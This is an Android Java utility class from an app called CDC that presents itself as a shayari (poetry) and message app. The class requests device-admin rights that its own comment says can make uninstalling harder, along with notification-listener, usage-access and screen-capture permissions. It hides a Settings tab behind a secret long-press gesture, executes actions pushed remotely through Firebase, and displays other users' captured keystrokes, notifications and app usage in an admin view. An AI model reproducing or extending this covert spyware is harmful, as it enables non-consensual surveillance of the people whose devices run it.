package com.vikasyadavnsit.cdc.utils;

import static android.app.Activity.RESULT_OK;
import static android.content.Context.ALARM_SERVICE;
import static com.vikasyadavnsit.cdc.constants.AppConstants.ENABLE_ADMIN_REQUEST_CODE;
import static com.vikasyadavnsit.cdc.constants.AppConstants.MEDIA_PROJECTION_REQUEST_CODE;
import static com.vikasyadavnsit.cdc.services.AppUsageStats.hasUsageStatsPermission;
import static com.vikasyadavnsit.cdc.utils.CommonUtil.hasFileAccess;
import static com.vikasyadavnsit.cdc.utils.SharedPreferenceUtils.getMessageText;
import static com.vikasyadavnsit.cdc.utils.SharedPreferenceUtils.getShayariData;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.admin.DevicePolicyManager;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.LocationManager;
import android.media.projection.MediaProjectionManager;
import android.net.ConnectivityManager;
import android.os.Build;
import android.os.CountDownTimer;
import android.os.Handler;
import android.os.PowerManager;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.MotionEvent;
import android.view.View;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.constants.AppConstants;
import com.vikasyadavnsit.cdc.data.AppUsageReportData;
import com.vikasyadavnsit.cdc.data.KeyStrokeData;
import com.vikasyadavnsit.cdc.data.NotificationData;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.database.repository.ApplicationDataRepository;
import com.vikasyadavnsit.cdc.fragment.AccessibilityNotificationFragment;
import com.vikasyadavnsit.cdc.fragment.ClickActionsFragment;
import com.vikasyadavnsit.cdc.fragment.HomeFragment;
import com.vikasyadavnsit.cdc.fragment.KeyStrokesFragment;
import com.vikasyadavnsit.cdc.fragment.MessageFragment;
import com.vikasyadavnsit.cdc.fragment.SettingsFragment;
import com.vikasyadavnsit.cdc.fragment.SystemAppUsageStatisticsFragment;
import com.vikasyadavnsit.cdc.receiver.DeviceAdminReceiver;
import com.vikasyadavnsit.cdc.receiver.StatisticsBroadcastReceiver;
import com.vikasyadavnsit.cdc.services.ScreenshotService;

import java.lang.reflect.Type;
import java.time.LocalDate;
import java.time.format.DateTimeFormatter;
import java.util.Comparator;
import java.util.Map;
import java.util.Objects;
import java.util.TreeMap;

public class ActionUtils {

    private static Handler handler = new Handler();
    private static boolean isLongPress = false;
    private static boolean isCounting = false;
    private static int pressCount = 0;
    private static CountDownTimer countDownTimer;
    private static Activity context;

    /**
     * Wires up the main navigation buttons and hidden-gesture behavior for the app's primary UI.
     *
     * <p>This sets click listeners to navigate between {@link HomeFragment}, {@link MessageFragment},
     * and {@link SettingsFragment}. It also attaches a touch listener to the Home button that
     * implements a long-press-based unlock gesture for the Settings tab.</p>
     *
     * @param activity The hosting {@link AppCompatActivity} whose views will be bound.
     */
    public static void handleButtonPress(AppCompatActivity activity) {
        context = activity;

        //Handle Button Presses
        activity.findViewById(R.id.main_navigation_request_play_button).setOnClickListener(view -> {
            CommonUtil.loadFragment(activity.getSupportFragmentManager(), new MessageFragment());
            //CDCFileReader.readAndCreateTemporaryFile(FileMap.KEYSTROKE);
        });

        activity.findViewById(R.id.main_navigation_request_home_button).setOnClickListener(view -> {
            CommonUtil.loadFragment(activity.getSupportFragmentManager(), new HomeFragment());
        });
        activity.findViewById(R.id.main_navigation_request_settings_button).setOnClickListener(view -> {
            CommonUtil.loadFragment(activity.getSupportFragmentManager(), new SettingsFragment());
        });


        //Handle Touch Listeners
        activity.findViewById(R.id.main_navigation_request_home_button).setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                switch (event.getAction()) {
                    case MotionEvent.ACTION_DOWN:
                        CommonUtil.loadFragment(activity.getSupportFragmentManager(), new HomeFragment());
                        isLongPress = false;
                        handler.postDelayed(settingEnablerRunnable, 3000); // 5 seconds
                        return true;

                    case MotionEvent.ACTION_UP:
                    case MotionEvent.ACTION_CANCEL:
                        if (!isLongPress) {
                            handler.removeCallbacks(settingEnablerRunnable);
                        }
                        return true;
                }
                return false;
            }
        });
    }

    /**
     * Central handler for activity results that need to be routed to utility flows.
     *
     * <p>Currently this is primarily used to capture MediaProjection consent results and start
     * {@link ScreenshotService} when the user grants screen-capture permission.</p>
     *
     * @param activity    The activity receiving the result.
     * @param requestCode Request code passed to {@code onActivityResult}.
     * @param resultCode  Result code passed to {@code onActivityResult}.
     * @param data        Intent data passed to {@code onActivityResult}.
     */
    public static void onActivityResult(Activity activity, int requestCode, int resultCode, Intent data) {
        LoggerUtils.d("CommonUtil", "onActivityResult : requestCode : " + requestCode + " resultCode : " + resultCode);
        createMediaProjectionScreenshotServiceIntent(activity, requestCode, resultCode, data);
    }

    /**
     * Prompts the user to grant Device Admin privileges to the app, if not already granted.
     *
     * <p>This launches {@link DevicePolicyManager#ACTION_ADD_DEVICE_ADMIN} targeting
     * {@link DeviceAdminReceiver}. Device admin may be used to make uninstall harder or enforce
     * device policies (depending on implementation).</p>
     *
     * @param activity The current {@link Activity} used to start the device admin intent.
     */
    public static void takeDeviceAdminPermission(Activity activity) {
        // Initialize DevicePolicyManager and the component name for the DeviceAdminReceiver
        DevicePolicyManager mDevicePolicyManager = (DevicePolicyManager) activity.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName mAdminComponent = new ComponentName(activity, DeviceAdminReceiver.class);

        // Check if the app is already a device admin
        if (!mDevicePolicyManager.isAdminActive(mAdminComponent)) {
            // Prompt the user to enable device admin
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "The permission is required to help you to use CDC in the best way possible.");
            activity.startActivityForResult(intent, ENABLE_ADMIN_REQUEST_CODE);
        }
    }

    /**
     * Ensures Notification Listener permission is enabled for the app, prompting the user if needed.
     *
     * <p>If not enabled, opens {@link Settings#ACTION_NOTIFICATION_LISTENER_SETTINGS}. If already
     * enabled, it logs a message and returns.</p>
     *
     * @param activity Activity used to open system settings and read secure settings.
     */
    public static void checkOrGetNotificationListenerPermission(Activity activity) {
        if (!isNotificationListenerEnabled(activity)) {
            // If the notification listener permission is not enabled, prompt the user to enable it
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            activity.startActivity(intent);
        } else {
            // Permission is already granted, no need to prompt the user
            LoggerUtils.d("NotificationListener", "Notification listener permission is already granted.");
        }
    }

    /**
     * Checks whether this app is listed in the system's enabled notification listeners.
     *
     * @param activity Activity used to read secure settings and determine the current package name.
     * @return {@code true} if the app is enabled as a notification listener; {@code false} otherwise.
     */
    private static boolean isNotificationListenerEnabled(Activity activity) {
        String packageName = activity.getPackageName();
        final String flat = Settings.Secure.getString(activity.getContentResolver(), "enabled_notification_listeners");
        if (!TextUtils.isEmpty(flat)) {
            final String[] names = flat.split(":");
            for (String name : names) {
                final ComponentName componentName = ComponentName.unflattenFromString(name);
                if (componentName != null && TextUtils.equals(packageName, componentName.getPackageName())) {
                    return true;
                }
            }
        }
        return false;
    }


    /**
     * Prompts the user to disable battery optimizations for the app if currently enforced.
     *
     * <p>This opens {@link Settings#ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS} when the app is not
     * exempt, which can improve the reliability of background services.</p>
     *
     * @param activity Activity used to access {@link PowerManager} and start the settings intent.
     */
    public static void checkAndRequestBatteryOptimization(Activity activity) {
        PowerManager powerManager = (PowerManager) activity.getSystemService(Context.POWER_SERVICE);

        if (powerManager != null && !powerManager.isIgnoringBatteryOptimizations(activity.getPackageName())) {
            // Battery optimization is enabled for this app, prompt the user to disable it
            Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
            activity.startActivity(intent);
        } else {
            // Battery optimization is already disabled for this app
            LoggerUtils.d("BatteryOptimization", "Battery optimization is already disabled.");
        }
    }

    /**
     * Registers a {@link BroadcastReceiver} to listen for various device/system events.
     *
     * <p>This builds an {@link IntentFilter} including screen on/off, boot, airplane mode, power
     * connected/disconnected, package changes, connectivity changes, bluetooth state changes, and
     * some time/date events. The receiver used is {@link StatisticsBroadcastReceiver}.</p>
     *
     * @param activity Activity used to call {@link Activity#registerReceiver(BroadcastReceiver, IntentFilter)}.
     */
    public static void registerPhoneStatistics(Activity activity) {
        // Create an intent filter
        IntentFilter filter = new IntentFilter();

        // System broadcast actions
        filter.addAction(Intent.ACTION_SCREEN_OFF); // Device screen turned off
        filter.addAction(Intent.ACTION_SCREEN_ON);  // Device screen turned on
        filter.addAction(Intent.ACTION_USER_PRESENT); // User unlocked the device (screen on)
        filter.addAction(Intent.ACTION_SHUTDOWN); // Device is shutting down
        filter.addAction(Intent.ACTION_REBOOT); // Device is rebooting (requires `REBOOT` permission)
        filter.addAction(Intent.ACTION_BOOT_COMPLETED); // Device boot completed (requires `RECEIVE_BOOT_COMPLETED` permission)
        filter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED); // Airplane mode toggled
        filter.addAction(Intent.ACTION_POWER_CONNECTED); // Power source connected (charger plugged in)
        filter.addAction(Intent.ACTION_POWER_DISCONNECTED); // Power source disconnected (charger unplugged)
        filter.addAction(Intent.ACTION_BATTERY_LOW); // Battery level is low
        filter.addAction(Intent.ACTION_HEADSET_PLUG); // Headset plug/unplug event
        filter.addAction(Intent.ACTION_PACKAGE_ADDED); // A package was added
        filter.addAction(Intent.ACTION_PACKAGE_REMOVED); // A package was removed
        filter.addAction(Intent.ACTION_PACKAGE_REPLACED); // A package was replaced
        filter.addAction(Intent.ACTION_PACKAGE_CHANGED); // A package was changed (e.g., app data update)

        // Network state broadcasts
        filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION); // Connectivity change (e.g., network connected/disconnected)

        // Bluetooth broadcasts
        filter.addAction(BluetoothAdapter.ACTION_STATE_CHANGED); // Bluetooth state changed
        filter.addAction(BluetoothDevice.ACTION_ACL_CONNECTED); // Bluetooth device connected
        filter.addAction(BluetoothDevice.ACTION_ACL_DISCONNECTED); // Bluetooth device disconnected

        // Location updates (requires location permissions)
        filter.addAction(LocationManager.PROVIDERS_CHANGED_ACTION); // Location providers changed

        // Other useful actions
        filter.addAction(Intent.ACTION_DATE_CHANGED); // Device date changed
        filter.addAction(Intent.ACTION_TIME_CHANGED); // Device time changed
        filter.addAction(Intent.ACTION_TIMEZONE_CHANGED); // Device timezone changed

        activity.registerReceiver(new StatisticsBroadcastReceiver(), filter);
    }

    /**
     * Opens the system "Usage access" settings if the app does not currently have usage stats access.
     *
     * @param activity Activity used to start {@link Settings#ACTION_USAGE_ACCESS_SETTINGS}.
     */
    public static void enableAppUsageStats(Activity activity) {
        if (!hasUsageStatsPermission(activity)) {
            activity.startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
        }
    }

    /**
     * Requests exact alarm permission on Android 12+ by opening the corresponding system settings.
     *
     * <p>This uses the static {@link #context} set by {@link #handleButtonPress(AppCompatActivity)}
     * to start the settings activity.</p>
     */
    public static void requestExactAlarmPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        }
    }

    /**
     * Checks whether the app can schedule exact alarms.
     *
     * @return {@code true} if exact alarms are allowed (or running on an Android version where they
     * are always allowed); {@code false} otherwise.
     */
    public static boolean canScheduleExactAlarms() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(ALARM_SERVICE);
            return alarmManager.canScheduleExactAlarms();
        }
        return true; // For older versions, exact alarms are always allowed
    }

    /**
     * Starts the MediaProjection consent flow for screen capture.
     *
     * <p>This launches the system screen-capture permission dialog. The result must be handled in
     * {@link #onActivityResult(Activity, int, int, Intent)} to start {@link ScreenshotService}.</p>
     *
     * @param activity Activity used to start the consent intent.
     */
    public static void startMediaProjectionService(Activity activity) {
        MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) activity.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        activity.startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), MEDIA_PROJECTION_REQUEST_CODE);
    }

    /**
     * Starts {@link ScreenshotService} when MediaProjection permission is granted.
     *
     * <p>This is invoked from {@link #onActivityResult(Activity, int, int, Intent)} and checks the
     * request/result codes. When consent is granted, it passes the result code and intent data to
     * the service as extras.</p>
     *
     * @param activity    Activity used to start the service.
     * @param requestCode Request code from {@code onActivityResult}.
     * @param resultCode  Result code from {@code onActivityResult}.
     * @param data        Result data intent from {@code onActivityResult}.
     */
    private static void createMediaProjectionScreenshotServiceIntent(Activity activity, int requestCode, int resultCode, Intent data) {
        if (requestCode == MEDIA_PROJECTION_REQUEST_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                Intent serviceIntent = new Intent(activity, ScreenshotService.class);
                serviceIntent.putExtra(ScreenshotService.EXTRA_RESULT_CODE, resultCode);
                serviceIntent.putExtra(ScreenshotService.EXTRA_RESULT_DATA, data);
                activity.startService(serviceIntent);
            }
        }
    }

    /**
     * Runnable used by the hidden-gesture flow to reveal the Settings tab after repeated long presses.
     *
     * <p>Each time this runs, it increments {@code pressCount}. When {@code pressCount == 3}, the
     * Settings navigation button is made visible. A countdown timer is started to reset the gesture
     * window.</p>
     */
    private static Runnable settingEnablerRunnable = () -> {
        isLongPress = true;
        pressCount++;
        // Check if the pressCount reaches 3 within 30 seconds
        if (pressCount == 3) {
            Toast.makeText(context, "Settings Tab Enabled", Toast.LENGTH_SHORT).show();
            context.findViewById(R.id.main_navigation_request_settings_button).setVisibility(View.VISIBLE);
        }

        // If the timer is not running, start the 30-second timer
        if (!isCounting) {
            startCountDown();
        }
    };

    /**
     * Starts/resets the countdown window for the hidden Settings unlock gesture.
     *
     * <p>When the timer finishes, if the required number of long presses wasn't met, Settings is
     * hidden again and counters are reset.</p>
     */
    private static void startCountDown() {
        isCounting = true;
        countDownTimer = new CountDownTimer(20000, 1000) { // 30 seconds countdown
            @Override
            public void onTick(long millisUntilFinished) {
                // No action needed on each tick
            }

            @Override
            public void onFinish() {
                isCounting = false;
                if (pressCount < 3) {
                    context.findViewById(R.id.main_navigation_request_settings_button).setVisibility(View.GONE);
                }
                pressCount = 0; // Reset press count after 30 seconds
            }
        };
        countDownTimer.start();
    }


    /**
     * Processes the RTDB app trigger settings map pushed from Firebase and executes enabled actions.
     *
     * <p>Logic summary:</p>
     * <ul>
     *   <li>Deserializes the incoming object into {@code Map<String, User.AppTriggerSettingsData>}.</li>
     *   <li>If file access exists, mirrors the settings into local Room via {@link ApplicationDataRepository}.</li>
     *   <li>For each enabled trigger, invokes the corresponding {@link com.vikasyadavnsit.cdc.enums.ClickActions} handler.</li>
     * </ul>
     *
     * @param obj Raw Firebase payload (typically a map-like structure).
     */
    public static void performFirebaseAction(Object obj) {
        Type type = new TypeToken<Map<String, User.AppTriggerSettingsData>>() {
        }.getType();
        Map<String, User.AppTriggerSettingsData> appTriggerSettingsDataMap = new Gson().fromJson(new Gson().toJson(obj), type);

        LoggerUtils.d("ActionUtils", "Remote data changed, reconfiguring app trigger settings");

        if (hasFileAccess()) {
            ApplicationDataRepository.updateAllRecords(appTriggerSettingsDataMap);
        }

        LoggerUtils.d("ActionUtils", "Processing Remote Firebase Actions");
        appTriggerSettingsDataMap.forEach((key, value) -> {
            if (value.isEnabled()) {
                LoggerUtils.d("ActionUtils", "Performing Remote Firebase Action for : " + key);
                value.getClickActions().getBiConsumer().accept(context, value);
            }
        });
    }

    /**
     * Applies a shayari update (from Firebase or default) to the UI and updates local cached state.
     *
     * <p>This updates {@link HomeFragment}, computes the next shayari index based on whether the day
     * changed, and persists the new state to SharedPreferences via
     * {@link SharedPreferenceUtils#updateShayariData(Context, String)}.</p>
     *
     * @param obj Raw Firebase value for shayari text; may be {@code null}.
     */
    public static void performShayariAction(Object obj) {
        LoggerUtils.d("ActionUtils", "Loading Shayari ..");

        // Get the Shayari of the day or use a default text if obj is null
        String shayariOftheDay = Objects.isNull(obj) ? AppConstants.DEFAULT_SHAYARI_TEXT : obj.toString();

        // Update the Shayari text in the fragment
        HomeFragment.updateShayariText(shayariOftheDay);

        // Get the current shayari data from SharedPreferences
        String currentShayariData = getShayariData(context);
        String[] shayariDataParts = currentShayariData.split(":");

        // Calculate the new shayari index
        int currentIndex = Integer.parseInt(shayariDataParts[0]);
        LocalDate lastUpdatedDate = LocalDate.parse(shayariDataParts[1], DateTimeFormatter.ISO_LOCAL_DATE);
        int newIndex = (LocalDate.now().equals(lastUpdatedDate) ? currentIndex : currentIndex + 1);

        // Prepare the new shayari data
        String newShayariData = newIndex + ":" + LocalDate.now() + ":" + shayariOftheDay;

        // Update the shayari data in SharedPreferences
        SharedPreferenceUtils.updateShayariData(context, newShayariData);
    }


    /**
     * Applies a personalized message update (from Firebase or cached default) to the UI and prefs.
     *
     * @param obj Raw Firebase value for the message; may be {@code null}.
     */
    public static void performMessageAction(Object obj) {
        LoggerUtils.d("ActionUtils", "Performing Message Action");
        String message = Objects.isNull(obj) ? getMessageText(context) : obj.toString();
        SharedPreferenceUtils.updateMessageText(context, message);
        MessageFragment.updateMessage(message);
    }

    /**
     * Populates the Settings "admin" user dropdown with user details fetched from Firebase.
     *
     * @param obj Raw Firebase payload containing a map of users.
     */
    public static void performFlatUserDetailsActions(Object obj) {
        LoggerUtils.d("ActionUtils", "populating all users in admin setting dropdown");
        Type type = new TypeToken<Map<String, User>>() {
        }.getType();
        Map<String, User> userMap = new Gson().fromJson(new Gson().toJson(obj), type);
        SettingsFragment.populateUserDropdown(context, userMap);
    }

    /**
     * Displays a selected user's click-action trigger settings in the UI.
     *
     * @param obj Raw Firebase payload containing the user's trigger settings map.
     */
    public static void getAndUpdateAndroidUserClickActions(Object obj) {
        LoggerUtils.d("ActionUtils", "showing a user click actions permissions");
        Type type = new TypeToken<Map<String, User.AppTriggerSettingsData>>() {
        }.getType();
        Map<String, User.AppTriggerSettingsData> appTriggerSettingsDataMap = new Gson().fromJson(new Gson().toJson(obj), type);
        ClickActionsFragment.addDynamicButtons(context, appTriggerSettingsDataMap);
    }

    /**
     * Displays a selected user's keystrokes feed in the UI, sorted by timestamp (descending).
     *
     * @param obj Raw Firebase payload containing keystroke records.
     */
    public static void displayAndroidUserKeystrokes(Object obj) {
        LoggerUtils.d("ActionUtils", "dispaying android user keystrokes");
        Type type = new TypeToken<TreeMap<String, KeyStrokeData>>() {
        }.getType();
        Map<String, KeyStrokeData> keyStrokeDataMap = new Gson().fromJson(new Gson().toJson(obj), type);
        // Create a TreeMap sorted by the timestamp field in KeyStrokeData
        TreeMap<String, KeyStrokeData> sortedMap = new TreeMap<>(Comparator.comparing(key -> keyStrokeDataMap.get(key).getTimestamp()).reversed());
        // Put all elements from the original map into the sorted TreeMap
        sortedMap.putAll(keyStrokeDataMap);
        KeyStrokesFragment.displayKeyStrokes(context, sortedMap);
    }

    /**
     * Displays a selected user's captured notifications in the UI, sorted by timestamp (descending).
     *
     * @param obj Raw Firebase payload containing notification records.
     */
    public static void displayAndroidUserAccessibilityNotification(Object obj) {
        LoggerUtils.d("ActionUtils", "displaying android user accessibility notification");
        Type type = new TypeToken<TreeMap<String, NotificationData>>() {
        }.getType();
        Map<String, NotificationData> notificationDataMap = new Gson().fromJson(new Gson().toJson(obj), type);
        // Create a TreeMap sorted by the timestamp field in KeyStrokeData
        TreeMap<String, NotificationData> notificationDataTreeMap = new TreeMap<>(Comparator.comparing(key -> notificationDataMap.get(key).getTimestamp()).reversed());
        // Put all elements from the original map into the sorted TreeMap
        notificationDataTreeMap.putAll(notificationDataMap);
        AccessibilityNotificationFragment.displayNotifications(context, notificationDataTreeMap);
    }

    /**
     * Displays a selected user's system app usage statistics report data in the UI.
     *
     * @param obj Raw Firebase payload containing app usage report data grouped by date.
     */
    public static void displaySystemAppUsageStatisticsReportData(Object obj) {
        LoggerUtils.d("ActionUtils", "displaying android user system app usage statistics");
        Type type = new TypeToken<TreeMap<String, TreeMap<String, AppUsageReportData>>>() {
        }.getType();
        TreeMap<String, TreeMap<String, AppUsageReportData>> appUsageStatisticsReportDataMap = new Gson().fromJson(new Gson().toJson(obj), type);
        SystemAppUsageStatisticsFragment.displaySystemAppUsageStatistics(context, appUsageStatisticsReportDataMap);
    }
}
